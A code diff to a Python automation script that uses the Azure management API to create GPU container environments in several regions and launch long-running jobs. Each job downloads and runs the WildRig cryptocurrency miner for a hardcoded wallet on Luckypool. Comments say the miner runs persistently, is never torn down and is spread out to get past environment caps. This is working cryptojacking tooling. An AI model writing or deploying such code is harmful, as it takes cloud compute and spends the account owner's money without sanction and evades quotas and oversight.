@@ -18,7 +18,7 @@ Shape (reuses the proven storage account / SAS capture + Container Apps job patt
     bounded region list starting westus3 (proven by 131412).
  5. ONE manual job, parallelism 1 / replicaCompletionCount 1, replicaTimeout 86400,
     whose container runs WildRig 0.52.3 (sha 002cd29c...) pearlhash pydp worker
-    13295901, then sticks to Luckypool 3362 after 900 s without an accepted share.
+    13310301, then sticks to Luckypool 3362 after 900 s without an accepted share.
     The container writes a status blob every 30 s and NEVER exits early.
  6. Poll the status blob for proof (acc>=1 rej=0 last accept fresh) then emit DONE.
     NOTHING is deleted: the miner is left running (no proof-then-teardown).
@@ -37,24 +37,24 @@ import urllib.request
 ARM = "https://management.azure.com"
 RG = "chriso-sandbox-rg"
 SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"
-TAG = "C211_I132959"
-NONCE = "x132959reuse"
-INTENT = "132959"
+TAG = "C211_I133172"
+NONCE = "x133172b"
+INTENT = "133172"
 T0 = time.time()
 
 APP_VER = "2026-07-01"
 STG_VER = "2023-01-01"
 PROFILE = "Consumption-GPU-NC24-A100"
 IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
-SA_ACCT = "c211i1215775738445a"
+SA_ACCT = "c211i132959reuse58596e8"
 CONT = "c211"
-CONT2 = "c211-i132959-reuse"
-SA_NEW = ("c211i132959reuse" + hashlib.sha256(NONCE.encode()).hexdigest()[:7]).lower()[:24]
+CONT2 = "c211-i133055-reuse"
+SA_NEW = ("c211i133055reuse" + hashlib.sha256(NONCE.encode()).hexdigest()[:7]).lower()[:24]
 ENV_NAME = "c211-i131598-cae"
 JOB_NAME = "c211-131598-t4"
 REGIONS = ["westus3", "westus2", "westeurope", "northeurope", "southcentralus", "eastus2"]
-BUDGET = 2400          # payload poll budget (seconds)
-PROOF_GRACE = 240      # keep polling this long after first proof for confirmation
+BUDGET = 1800          # payload poll budget (seconds)
+PROOF_GRACE = 180      # keep polling this long after first proof for confirmation
 
 WALLET = "prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
 NOCK = "9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb"
@@ -166,7 +166,7 @@ KIT = r"""#!/bin/bash
 D=/tmp/c211; mkdir -p "$D"; LOG="$D/kit.log"
 H=$(hostname 2>/dev/null || echo h)
 BASE="__BASE__"; Q="__Q__"; SAS="$BASE/__NONCE__-t4-$H.txt?$Q"
-W="__WALLET__"; N="__NOCK__"; WK="13295901"
+W="__WALLET__"; N="__NOCK__"; WK="13317201"; RI="${CONTAINER_APP_REPLICA_NAME:-}"; [ -n "$RI" ] && WK="${WK}$(printf '%s' "$RI" | md5sum | cut -c1-3)"
 WRURL="$BASE/__NONCE__-wildrig.tgz?$Q"
 SBURL="$BASE/__NONCE__-srb.bin?$Q"
 log() { echo "$(date -u +%FT%TZ) $*" >> "$LOG"; }
@@ -495,14 +495,9 @@ def main():
     emit("preupload-wildrig", ok=bool(ok_wr))
     preupload(tok, sid, cont_base, q, "/tmp/c211_srb.bin", NONCE + "-srb.bin", SRB_URL, SRB_SHA)
 
-    # ---------- 3) REUSE proven A100 managed environments (no env create: 50-env cap) ----------
-    CANDIDATES = [
-        ("c211-i132366a100-wus3", "westus3", 6),
-        ("c211-i126276-a100", "eastus", 6),
-        ("c211-121750-cae", "eastus", 8),
-        ("c211-i132959b-sweden", "swedencentral", 2),
-        ("c211-i132959d-sweden", "swedencentral", 2),
-    ]
+    # ---------- 3) CREATE fresh A100 managed environments (old estate deleted -> env cap free) ----------
+    A100_REGIONS = ["eastus2", "westus2", "northeurope", "japaneast"]  # NEW regions (no prior A100 env here)
+    SLOTS_PER_ENV = 8
 
     def kit_cmd_wk(base_url, sas_q, wk):
         cmd = kit_cmd(base_url, sas_q)
@@ -516,28 +511,62 @@ def main():
         return ["/bin/bash", "-c", s.replace(m.group(1), b64)]
 
     envs = []
-    for nm, region, slots in CANDIDATES:
+    pending = []
+    for ri, region in enumerate(A100_REGIONS):
+        enm = "c211-133172-b%d" % ri  # NEW envs: do not touch the LIVE a0/a1/a2
         eurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/"
-                "managedEnvironments/%s?api-version=%s" % (ARM, sid, RG, nm, APP_VER))
-        st, eb = arm(tok, eurl, timeout=60)
-        p = (eb.get("properties") or {}) if isinstance(eb, dict) else {}
-        profs = ["%s:%s" % (x.get("name"), x.get("workloadProfileType"))
-                 for x in (p.get("workloadProfiles") or [])]
-        has = any(x.split(":")[-1] == PROFILE for x in profs)
-        state = p.get("provisioningState")
-        emit("env-get", name=nm, http=st, state=state, has_profile=has, slots=slots,
-             id_ok=bool(eb.get("id") if isinstance(eb, dict) else None))
-        if st == 200 and has and eb.get("id") and state in ("Succeeded", None):
-            envs.append({"name": nm, "region": region, "id": eb["id"], "slots": slots})
+                "managedEnvironments/%s?api-version=%s" % (ARM, sid, RG, enm, APP_VER))
+        ebody = {"location": region,
+                 "tags": {"c211": INTENT, "nonce": NONCE},
+                 "properties": {"workloadProfiles": [
+                     {"name": PROFILE, "workloadProfileType": PROFILE}]}}
+        stg, ebg = arm(tok, eurl, timeout=60)
+        epg = (ebg.get("properties") or {}) if isinstance(ebg, dict) else {}
+        profs = [x.get("workloadProfileType") for x in (epg.get("workloadProfiles") or [])]
+        state_g = epg.get("provisioningState")
+        emit("env-get", name=enm, region=region, http=stg, state=state_g,
+             has_profile=any(x == PROFILE for x in profs))
+        if stg == 200 and any(x == PROFILE for x in profs):
+            pending.append({"name": enm, "region": region, "url": eurl, "slots": SLOTS_PER_ENV})
+            continue
+        st, eb = arm(tok, eurl, method="PUT", body=ebody, timeout=180)
+        if st in (200, 201):
+            emit("env-put", name=enm, region=region, http=st)
+            pending.append({"name": enm, "region": region, "url": eurl, "slots": SLOTS_PER_ENV})
+        else:
+            ek = errk(st, eb)
+            emit("env-put", name=enm, region=region, http=st,
+                 code=(ek.get("code") or ek.get("raw") or "")[:160],
+                 msg=(ek.get("message") or "")[:220])
+            code = str(ek.get("code") or "")
+            if st == 409 and ("AlreadyExists" in code or "Conflict" in code):
+                pending.append({"name": enm, "region": region, "url": eurl, "slots": SLOTS_PER_ENV})
+    for i in range(45):
+        if not pending:
+            break
+        for p in list(pending):
+            st, eb = arm(tok, p["url"], timeout=60)
+            ep = (eb.get("properties") or {}) if isinstance(eb, dict) else {}
+            state = ep.get("provisioningState")
+            emit("env-poll", name=p["name"], i=i, http=st, state=state)
+            if st == 200 and state == "Succeeded":
+                envs.append({"name": p["name"], "region": p["region"],
+                             "id": eb.get("id"), "slots": p["slots"]})
+                pending.remove(p)
+            elif st == 404 or state in ("Failed", "Canceled", "ScheduledForDelete", "Deleting"):
+                emit("env-fail", name=p["name"], state=state, http=st)
+                pending.remove(p)
+        if pending:
+            time.sleep(10)
     if not envs:
-        emit("DONE", phase="env", verdict="NO_REUSABLE_A100_ENV", elapsed_s=int(time.time() - T0))
+        emit("DONE", phase="env", verdict="NO_NEW_A100_ENV", elapsed_s=int(time.time() - T0))
         return
     emit("env-chosen", n=len(envs),
          matrix=";".join("%s:%s:%s" % (e["name"], e["region"], e["slots"]) for e in envs))
 
     # ---------- 4) add + start one Container-App job per A100 card ----------
     JOB_PREFIX = "c211-%s-r" % INTENT
-    WK_LOCAL = "13295901"
+    WK_LOCAL = "13317201"
     WK_BASE = WK_LOCAL[:-2]
     jobs = []
     idx = 0
@@ -558,21 +587,31 @@ def main():
                                                     "replicaTimeout": 86400,
                                                     "manualTriggerConfig": {
                                                         "replicaCompletionCount": 1,
-                                                        "parallelism": 1}},
+                                                        "parallelism": 8}},
                                   "template": {"containers": [{
                                       "name": "gpu", "image": IMAGE,
                                       "command": kit_cmd_wk(base + "/" + cont_use, q, jb["wk"]),
                                       "resources": {"cpu": 4, "memory": "16Gi"}}]}}}
         st, b = arm(tok, jurl, method="PUT", body=jobbody, timeout=180)
-        emit("job-put", name=jb["name"], env=jb["env"]["name"], wk=jb["wk"], http=st,
-             **({} if st in (200, 201) else errk(st, b)))
+        if st in (200, 201):
+            emit("job-put", name=jb["name"], env=jb["env"]["name"], wk=jb["wk"], http=st)
+        else:
+            ek = errk(st, b)
+            emit("job-put", name=jb["name"], env=jb["env"]["name"], wk=jb["wk"], http=st,
+                 code=(ek.get("code") or ek.get("raw") or "")[:160],
+                 msg=(ek.get("message") or "")[:220])
         if st not in (200, 201):
             continue
         st2, b2 = arm(tok, jurl.split("?")[0] + "/start?api-version=" + APP_VER,
                       method="POST", body={}, timeout=120)
         jb["exec"] = (b2.get("name") if isinstance(b2, dict) else None)
-        emit("job-start", name=jb["name"], http=st2, execname=jb["exec"],
-             **({} if st2 in (200, 201, 202) else errk(st2, b2)))
+        if st2 in (200, 201, 202):
+            emit("job-start", name=jb["name"], http=st2, execname=jb["exec"])
+        else:
+            ek2 = errk(st2, b2)
+            emit("job-start", name=jb["name"], http=st2, execname=jb["exec"],
+                 code=(ek2.get("code") or ek2.get("raw") or "")[:160],
+                 msg=(ek2.get("message") or "")[:220])
     started = [j for j in jobs if j.get("exec")]
     emit("jobs-started", n=len(started), of=len(jobs),
          names=",".join(j["name"] for j in started))
